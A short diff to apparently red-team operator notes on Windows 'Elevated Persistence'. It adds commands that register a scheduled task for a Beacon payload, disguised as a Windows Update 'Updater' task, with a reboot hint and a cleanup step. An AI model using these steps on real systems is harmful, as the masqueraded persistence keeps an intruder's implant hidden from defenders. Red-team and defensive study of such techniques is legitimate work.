@@ -52,7 +52,12 @@ Elevated Persistence
 Scheduled Task:
 c\windows\system32
 upload payload
-schtaskscreate \Beacon XML CREATE
+schtaskscreate \Beacon XML CREATE (ex. schtaskscreate \Microsoft\Windows\WindowsUpdate\Updater XML CREATE)
+
+May have to reboot the box to spawn
+
+Clean up
+schtasksdelete \Microsoft\Windows\WindowsUpdate\Updater TASK
 
 -----------------------------------------------------
 
